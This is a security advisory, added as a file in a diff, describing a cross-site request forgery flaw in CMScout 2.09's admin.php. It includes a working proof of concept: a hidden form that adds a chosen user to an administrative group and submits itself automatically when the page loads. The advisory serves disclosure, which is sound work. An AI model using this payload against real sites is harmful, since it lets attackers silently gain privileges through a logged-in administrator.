@@ -1,0 +1,29 @@
+Vulnerability ID: HTB22719
+Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_cmscout.html
+Product: CMScout
+Vendor: CMScout Team ( http://www.cmscout.co.za/ ) 
+Vulnerable Version: 2.09 and probably prior versions
+Vendor Notification: 25 November 2010 
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Low 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "admin.php" script to properly verify the source of HTTP request.
+
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin.php?page=users&subpage=usergroups&subpage=usergroups&action=add&uid=USER_ID" method="post" name="main" >
+<input type="hidden" name="gid" value="1">
+<input type="hidden" name="utype" value="2">
+<input type="hidden" name="action" value="Add">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+
